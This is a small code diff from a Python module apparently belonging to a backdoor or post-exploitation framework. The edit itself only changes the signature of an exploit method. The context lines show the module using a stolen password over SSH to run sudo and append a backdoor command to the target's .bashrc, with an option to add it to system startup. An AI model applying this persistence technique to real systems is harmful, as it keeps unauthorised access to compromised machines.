@@ -12,7 +12,7 @@ class Startup(Module):
                 "init": Option("init", False, "Add to system startup", False),
                 }
 
-    def exploit(self, backdoor):
+    def exploit(self):
         if(self.get_value("bash")):
             self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'" + self.backdoor.get_command() + " > /dev/null \' >> .bashrc")
         if(self.get_value("init")):
